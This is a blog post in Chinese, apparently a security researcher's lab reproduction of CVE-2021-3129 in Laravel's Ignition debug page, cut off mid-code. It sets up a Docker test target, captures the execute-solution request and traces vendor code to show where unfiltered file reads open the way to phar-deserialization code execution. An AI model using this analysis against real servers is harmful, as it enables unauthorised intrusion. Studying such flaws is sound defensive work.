{"title":"CVE-2021-3129","date":"2023-03-01T10:45:09.000Z","date_formatted":{"ll":"Mar 1, 2023","L":"03/01/2023","MM-DD":"03-01"},"link":"2023/03/01/CVE-2021-3129","tags":["CVEs"],"updated":"2023-03-05T13:28:23.829Z","content":"<p>這個漏洞在之前在某家公司實習的時候有遇過，覺得滿有趣的 w</p>\n<span id=\"more\"></span>\n<h2 id=\"漏洞成因\">漏洞成因<a title=\"#漏洞成因\" href=\"#漏洞成因\"></a></h2>\n<p>一定要是 Debug mode 下，Ignition 功能沒有過濾好導致可以透過 <code>file_get_contents</code> 和 <code>file_put_contents</code> 讀取寫入檔案，透過構造 phar 反序列化攻擊來達到 RCE</p>\n<h2 id=\"復現\">復現<a title=\"#復現\" href=\"#復現\"></a></h2>\n<ul>\n<li><a href=\"https://github.com/vulhub/vulhub/tree/master/laravel/CVE-2021-3129\" target=\"_blank\">https://github.com/vulhub/vulhub/tree/master/laravel/CVE-2021-3129</a></li>\n<li><code>docker-compose.yml</code></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">version: &#x27;2&#x27;</span><br><span class=\"line\">services:</span><br><span class=\"line\"> web:</span><br><span class=\"line\">   image: vulhub/laravel:8.4.2</span><br><span class=\"line\">   ports:</span><br><span class=\"line\">    - &quot;8787:80&quot;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose up --build --force-recreate --no-deps</span><br></pre></td></tr></table></figure>\n<ul>\n<li>之後訪問 <a href=\"http://0.0.0.0:8787\" target=\"_blank\">http://0.0.0.0:8787</a> 就可看到以下畫面</li>\n</ul>\n<p><img src=\"https://i.imgur.com/O3VG2EC.png\" alt=\"\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"造成漏洞（？\">造成漏洞（？<a title=\"#造成漏洞（？\" href=\"#造成漏洞（？\"></a></h3>\n<ul>\n<li>這邊我稍微改一下 code，這樣可以讓 debug mode 起作用，他會告訴我說推薦的解決方案</li>\n<li>在 <code>/var/www/resources/views</code> 新增一個 <code>exploit.blade.php</code></li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># /var/www/resources/views/exploit.blade.php</span></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=<span class=\"string\">&quot;en&quot;</span>&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span><br><span class=\"line\">    &lt;meta http-equiv=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> content=<span class=\"string\">&quot;IE=edge&quot;</span>&gt;</span><br><span class=\"line\">    &lt;meta name=<span class=\"string\">&quot;viewport&quot;</span> content=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class=\"line\">    &lt;title&gt;Exploit&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &#123;&#123; <span class=\"variable\">$test</span> &#125;&#125;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>之後在 <code>/var/www/routes/web.php</code> 新增</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Route</span>::<span class=\"title function_ invoke__\">get</span>(<span class=\"string\">&quot;/exploit&quot;</span>, function() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">view</span>(<span class=\"string\">&quot;exploit&quot;</span>);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>之後訪問 <code>http://0.0.0.0/exploit</code> 就可以看到 debug 頁面啦</li>\n</ul>\n<p><img src=\"https://i.imgur.com/Pl7hulG.png\" alt=\"\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"分析\">分析<a title=\"#分析\" href=\"#分析\"></a></h3>\n<ul>\n<li>按下去 <code>Make variable optional</code> 可以發現他會幫你改好他建議的 code，這個時候用 burp 看一下到底送了什麼</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /_ignition/execute-solution HTTP/1.1</span><br><span class=\"line\">Host: 0.0.0.0:8787</span><br><span class=\"line\">Content-Length: 169</span><br><span class=\"line\">Accept: application/json</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Origin: http://0.0.0.0:8787</span><br><span class=\"line\">Referer: http://0.0.0.0:8787/exploit</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: en-US,en;q=0.9</span><br><span class=\"line\">Cookie: XSRF-TOKEN=eyJpdiI6InQ2RzhvSTAvWlh6UUZpZ1hqb0pDY0E9PSIsInZhbHVlIjoiRHE4WHprSXFUS2ZvS0pPY2tEMERSZjhPSWdocG42R1c3OGRaSTVSNmovcFlYeFAyalJuY3l5RllOZkcrREJqL0d5NUdPK1JLL0hMaFdWZ3hyWWJzNHJUZ2ZQUzRFTVcwWHVGeDVScFZ4em1nRWcxV1RobGJsTFJQMFdIN0N5RloiLCJtYWMiOiIwNzVhYzdmNGZmMTY2MmMwZDk0ODJjNTJjYTM5ODg4MTU2YmY1YjM2YTA4OTJmMDllMzIwMjZiZDA0Mjc0OGEyIn0%3D; laravel_session=eyJpdiI6IklGajgyUTR5K0RRUGpxWk52MUZkNUE9PSIsInZhbHVlIjoidXp3clZTTVdhUmhFNkJIUm1NUUlxQXRqeTgzckRRaDNzQVNFa2RTY3FINlFkYkhKcDluQUhjTlVGRnRJK0VrK1JVN1NKS2xhQVExSjRQT0RwZk84ZFF4ejVjbzRWTHRmUDE4U2I0TkhXL1lXUEtVWjE4aVFjOXE0SGlwbFpFUmsiLCJtYWMiOiIxZDIwNWEzYTFkNTVjYTZiNWZjOGZiZGZkYjEwY2NhZGI2YTEyNTg5Y2ExZjljMmM0M2ZjMzJiNTgwODE0M2QxIn0%3D</span><br><span class=\"line\">x-forwarded-for: 198.51.100.215</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;test&quot;,&quot;viewFile&quot;:&quot;/var/www/resources/views/exploit.blade.php&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>追一下 code</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># /var/www/vendor/facade/ignition/src/IgnitionServiceProvider.php</span></span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">registerHousekeepingRoutes</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;app-&gt;<span class=\"title function_ invoke__\">runningInConsole</span>()) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title class_\">Route</span>::<span class=\"title function_ invoke__\">group</span>([</span><br><span class=\"line\">        <span class=\"string\">&#x27;as&#x27;</span> =&gt; <span class=\"string\">&#x27;ignition.&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;prefix&#x27;</span> =&gt; <span class=\"title function_ invoke__\">config</span>(<span class=\"string\">&#x27;ignition.housekeeping_endpoint_prefix&#x27;</span>, <span class=\"string\">&#x27;_ignition&#x27;</span>),</span><br><span class=\"line\">        <span class=\"string\">&#x27;middleware&#x27;</span> =&gt; [<span class=\"title class_\">IgnitionEnabled</span>::<span class=\"variable language_\">class</span>],</span><br><span class=\"line\">    ], function () &#123;</span><br><span class=\"line\">        <span class=\"title class_\">Route</span>::<span class=\"title function_ invoke__\">get</span>(<span class=\"string\">&#x27;health-check&#x27;</span>, <span class=\"title class_\">HealthCheckController</span>::<span class=\"variable language_\">class</span>)-&gt;<span class=\"title function_ invoke__\">name</span>(<span class=\"string\">&#x27;healthCheck&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title class_\">Route</span>::<span class=\"title function_ invoke__\">post</span>(<span class=\"string\">&#x27;execute-solution&#x27;</span>, <span class=\"title class_\">ExecuteSolutionController</span>::<span class=\"variable language_\">class</span>)</span><br><span class=\"line\">            -&gt;<span class=\"title function_ invoke__\">middleware</span>(<span class=\"title class_\">IgnitionConfigValueEnabled</span>::<span class=\"variable language_\">class</span>.<span class=\"string\">&#x27;:enableRunnableSolutions&#x27;</span>)</span><br><span class=\"line\">            -&gt;<span class=\"title function_ invoke__\">name</span>(<span class=\"string\">&#x27;executeSolution&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title class_\">Route</span>::<span class=\"title function_ invoke__\">post</span>(<span class=\"string\">&#x27;share-report&#x27;</span>, <span class=\"title class_\">ShareReportController</span>::<span class=\"variable language_\">class</span>)</span><br><span class=\"line\">            -&gt;<span class=\"title function_ invoke__\">middleware</span>(<span class=\"title class_\">IgnitionConfigValueEnabled</span>::<span class=\"variable language_\">class</span>.<span class=\"string\">&#x27;:enableShareButton&#x27;</span>)</span><br><span class=\"line\">            -&gt;<span class=\"title function_ invoke__\">name</span>(<span class=\"string\">&#x27;shareReport&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title class_\">Route</span>::<span class=\"title function_ invoke__\">get</span>(<span class=\"string\">&#x27;scripts/&#123;script&#125;&#x27;</span>, <span class=\"title class_\">ScriptController</span>::<span class=\"variable language_\">class</span>)-&gt;<span class=\"title function_ invoke__\">name</span>(<span class=\"string\">&#x27;scripts&#x27;</span>);</span><br><span class=\"line\">        <span class=\"title class_\">Route</span>::<span class=\"title function_ invoke__\">get</span>(<span class=\"string\">&#x27;styles/&#123;style&#125;&#x27;</span>, <span class=\"title class_\">StyleController</span>::<span class=\"variable language_\">class</span>)-&gt;<span class=\"title function_ invoke__\">name</span>(<span class=\"string\">&#x27;styles&#x27;</span>);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>從 <code>execute-solution</code> 那邊進去</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># /var/www/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Facade</span>\\<span class=\"title class_\">Ignition</span>\\<span class=\"title class_\">Http</span>\\<span class=\"title class_\">Controllers</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Facade</span>\\<span class=\"title\">Ignition</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Requests</span>\\<span class=\"title\">ExecuteSolutionRequest</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Facade</span>\\<span class=\"title\">IgnitionContracts</span>\\<span class=\"title\">SolutionProviderRepository</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Illuminate</span>\\<span class=\"title\">Foundation</span>\\<span class=\"title\">Validation</span>\\<span class=\"title\">ValidatesRequests</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ExecuteSolutionController</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">use</span> <span class=\"title\">ValidatesRequests</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">        ExecuteSolutionRequest <span class=\"variable\">$request</span>,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">        SolutionProviderRepository <span class=\"variable\">$solutionProviderRepository</span></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    </span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$solution</span> = <span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">getRunnableSolution</span>();</span><br><span class=\"line\">        <span class=\"comment\">// print_r($solution);</span></span><br><span class=\"line\">        <span class=\"variable\">$solution</span>-&gt;<span class=\"title function_ invoke__\">run</span>(<span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">get</span>(<span class=\"string\">&#x27;parameters&#x27;</span>, []));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">response</span>(<span class=\"string\">&#x27;&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>找一下 <code>getRunnableSolution</code></li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># /var/www/vendor/facade/ignition/src/Http/Requests/ExecuteSolutionRequest.php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ExecuteSolutionRequest</span> <span class=\"keyword\">extends</span> <span class=\"title\">FormRequest</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">rules</span>(<span class=\"params\"></span>): <span class=\"title\">array</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> [</span><br><span class=\"line\">            <span class=\"string\">&#x27;solution&#x27;</span> =&gt; <span class=\"string\">&#x27;required&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;parameters&#x27;</span> =&gt; <span class=\"string\">&#x27;array&#x27;</span>,</span><br><span class=\"line\">        ];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getSolution</span>(<span class=\"params\"></span>): <span class=\"title\">Solution</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$solution</span> = <span class=\"title function_ invoke__\">app</span>(<span class=\"title class_\">SolutionProviderRepository</span>::<span class=\"variable language_\">class</span>)</span><br><span class=\"line\">            -&gt;<span class=\"title function_ invoke__\">getSolutionForClass</span>(<span class=\"variable\">$this</span>-&gt;<span class=\"title function_ invoke__\">get</span>(<span class=\"string\">&#x27;solution&#x27;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">abort_if</span>(<span class=\"title function_ invoke__\">is_null</span>(<span class=\"variable\">$solution</span>), <span class=\"number\">404</span>, <span class=\"string\">&#x27;Solution could not be found&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/** <span class=\"doctag\">@var</span> Solution */</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$solution</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getRunnableSolution</span>(<span class=\"params\"></span>): <span class=\"title\">RunnableSolution</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$solution</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">getSolution</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (! <span class=\"variable\">$solution</span> <span class=\"keyword\">instanceof</span> RunnableSolution) &#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">abort</span>(<span class=\"number\">404</span>, <span class=\"string\">&#x27;Runnable solution could not be found&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$solution</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>再找一下 <code>getSolutionForClass</code></li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getSolutionForClass</span>(<span class=\"params\"><span class=\"keyword\">string</span> <span class=\"variable\">$solutionClass</span></span>): ?<span class=\"title\">Solution</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (! <span class=\"title function_ invoke__\">class_exists</span>(<span class=\"variable\">$solutionClass</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (! <span class=\"title function_ invoke__\">in_array</span>(<span class=\"title class_\">Solution</span>::<span class=\"variable language_\">class</span>, <span class=\"title function_ invoke__\">class_implements</span>(<span class=\"variable\">$solutionClass</span>))) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">app</span>(<span class=\"variable\">$solutionClass</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>好吧，看起來應該是寫死的東西，我決定直接把 <code>$solution</code> 直接 print 出來</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution Object</span><br><span class=\"line\">(</span><br><span class=\"line\">    [variableName:Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution:private] =&gt; </span><br><span class=\"line\">    [viewFile:Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution:private] =&gt; </span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>搜尋一下關鍵的 file 在 <code>/var/www/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</code></li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MakeViewVariableOptionalSolution</span> <span class=\"keyword\">implements</span> <span class=\"title\">RunnableSolution</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\"># 省略</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">run</span>(<span class=\"params\"><span class=\"keyword\">array</span> <span class=\"variable\">$parameters</span> = []</span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\"># print_r($parameters);</span></span><br><span class=\"line\">        <span class=\"comment\"># Array</span></span><br><span class=\"line\">        <span class=\"comment\"># (</span></span><br><span class=\"line\">        <span class=\"comment\">#   [variableName] =&gt; test</span></span><br><span class=\"line\">        <span class=\"comment\">#   [viewFile] =&gt; /var/www/resources/views/exploit.blade.php</span></span><br><span class=\"line\">        <span class=\"comment\"># )</span></span><br><span class=\"line\">        <span class=\"variable\">$output</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">makeOptional</span>(<span class=\"variable\">$parameters</span>);</span><br><span class=\"line\">        <span class=\"comment\"># 只要比對是正確的就可以寫入</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$output</span> !== <span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"variable\">$parameters</span>[<span class=\"string\">&#x27;viewFile&#x27;</span>], <span class=\"variable\">$output</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">makeOptional</span>(<span class=\"params\"><span class=\"keyword\">array</span> <span class=\"variable\">$parameters</span> = []</span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\"># 沒有任何過濾，可以想到如果 viewFile 給 php 偽協議可以改變他讀取到的內容</span></span><br><span class=\"line\">        <span class=\"variable\">$originalContents</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$parameters</span>[<span class=\"string\">&#x27;viewFile&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"comment\"># 把 variableName 改成如果不設置的話為空</span></span><br><span class=\"line\">        <span class=\"variable\">$newContents</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;$&#x27;</span>.<span class=\"variable\">$parameters</span>[<span class=\"string\">&#x27;variableName&#x27;</span>], <span class=\"string\">&#x27;$&#x27;</span>.<span class=\"variable\">$parameters</span>[<span class=\"string\">&#x27;variableName&#x27;</span>].<span class=\"string\">&quot; ?? &#x27;&#x27;&quot;</span>, <span class=\"variable\">$originalContents</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$originalTokens</span> = <span class=\"title function_ invoke__\">token_get_all</span>(<span class=\"title class_\">Blade</span>::<span class=\"title function_ invoke__\">compileString</span>(<span class=\"variable\">$originalContents</span>));</span><br><span class=\"line\">        <span class=\"comment\"># Blade::compileString($newContents) 如果把這個東西印出來就可以看到他其實是把模板的語法轉成 php tag</span></span><br><span class=\"line\">        <span class=\"comment\"># &lt;?php echo e($test ?? &#x27;&#x27;); ?&gt;</span></span><br><span class=\"line\">        <span class=\"comment\"># token_get_all https://php.golaravel.com/function.token-get-all.html</span></span><br><span class=\"line\">        <span class=\"comment\"># 將提供的程式碼按 PHP tag 進行分割</span></span><br><span class=\"line\">        <span class=\"variable\">$newTokens</span> = <span class=\"title function_ invoke__\">token_get_all</span>(<span class=\"title class_\">Blade</span>::<span class=\"title function_ invoke__\">compileString</span>(<span class=\"variable\">$newContents</span>));</span><br><span class=\"line\">        <span class=\"comment\"># 比對修改的結果，如果正確就寫入指定的檔案</span></span><br><span class=\"line\">        <span class=\"variable\">$expectedTokens</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">generateExpectedTokens</span>(<span class=\"variable\">$originalTokens</span>, <span class=\"variable\">$parameters</span>[<span class=\"string\">&#x27;variableName&#x27;</span>]);</span><br><span 